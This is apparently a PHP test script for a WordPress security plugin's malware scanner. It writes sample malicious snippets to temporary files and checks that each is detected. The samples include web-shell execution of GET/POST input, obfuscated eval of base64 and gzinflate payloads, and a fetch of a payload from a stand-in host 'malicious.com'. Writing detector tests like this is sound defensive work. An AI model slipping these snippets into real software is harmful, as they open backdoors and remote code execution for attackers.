<?php
/**
 * Simple test script to verify malware detection is working
 * This should be run in WordPress environment or removed after testing
 */

// Include the scanner class (adjust path as needed)
require_once __DIR__ . '/includes/class-scanner.php';
require_once __DIR__ . '/includes/class-database.php';
require_once __DIR__ . '/includes/class-logger.php';

echo "Testing malware detection patterns...\n\n";

// Test malware patterns
$test_patterns = array(
    'eval(base64_decode("dGVzdA=="));' => 'Should detect base64+eval',
    'system($_GET["cmd"]);' => 'Should detect GET execution',
    'exec($_POST["command"]);' => 'Should detect POST execution', 
    '<?php eval(gzinflate(base64_decode("test")));' => 'Should detect compressed eval',
    'preg_replace("/test/e", $_GET["code"], "test");' => 'Should detect preg_replace /e',
    'create_function("", $_POST["code"]);' => 'Should detect create_function',
    'file_get_contents("http://malicious.com/payload.php");' => 'Should detect remote inclusion'
);

foreach ($test_patterns as $code => $description) {
    echo "Testing: $description\n";
    echo "Pattern: " . substr($code, 0, 50) . "...\n";
    
    // Create temporary test file
    $test_file = __DIR__ . '/test_malware_' . uniqid() . '.php';
    file_put_contents($test_file, $code);
    
    try {
        // Test the pattern detection
        $scanner = new Themewire_Security_Scanner(null, null, null);
        $result = $scanner->test_malware_detection($test_file);
        $found = $result['suspicious'] ? 'DETECTED' : 'NOT DETECTED';
        
        echo "Result: $found";
        if ($result['suspicious']) {
            echo " - " . $result['reason'];
            if (!empty($result['issues'])) {
                echo " (Severity: " . $result['issues'][0]['severity'] . ")";
            }
        }
        echo "\n";
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage() . "\n";
    }
    
    // Clean up test file
    if (file_exists($test_file)) {
        unlink($test_file);
    }
    
    echo str_repeat('-', 50) . "\n";
}

echo "\nTest completed. If all patterns show 'DETECTED', malware detection is working correctly.\n";
